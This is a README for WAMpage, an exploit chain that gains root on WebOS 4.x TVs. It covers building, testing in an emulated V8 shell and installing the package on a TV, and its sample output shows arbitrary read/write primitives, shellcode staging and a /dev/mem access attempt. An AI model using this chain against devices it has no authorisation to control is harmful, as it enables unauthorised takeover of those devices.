# WAMpage
WAMpage - A WebOS root LPE exploit chain

Currently only supports WebOS 4.x on 32-bit SoCs.

## Building

Prerequesites:

```bash
apt install qemu-user
npm install -g @webosose/ares-cli
```

Compiling:

```bash
make
```

## Testing Locally

`make test` will build and run the exploit in `d8`, running in `qemu-arm`. (A pre-compiled version of d8 and its dependencies are included in the `bin/` directory). If the exploit works succesfully, you'll probably get something like this:

```
[+] Starting WAMpage...
[+] addrof(myobj) = 0x5a68f5d1
[+] Test: reconstructed myobj: {"foo":"bar"}
[+] Set up arbread32/arbwrite32.
[+] stage2 shellcode loaded @ 0xff458000
[+] myfunc @ 0x5a693369
[+] stage1 RWX buf @ 0x5bb8f280
[+] Copied stage1 shellcode. Calling...
Traceback (most recent call last):
  File "<stdin>", line 25, in <module>
IOError: [Errno 13] Permission denied: '/dev/mem'
```

The permission error is expected, assuming your machine isn't totally misconfigured.

You can test the `devmemes.py` exploit by running it directly on a TV, but you'll either need root to begin with, or some other kind of unsandboxed/unjailed shell.

## Installation on TV

You can use `ares-install`, or manually copy over the IPK and run this from the devmode shell:

```bash
luna-send-pub -i 'luna://com.webos.appInstallService/dev/install' '{"id":"tv.rootmy.wampage","ipkUrl":"/path/to/wampage.ipk","subscribe":true}'
```
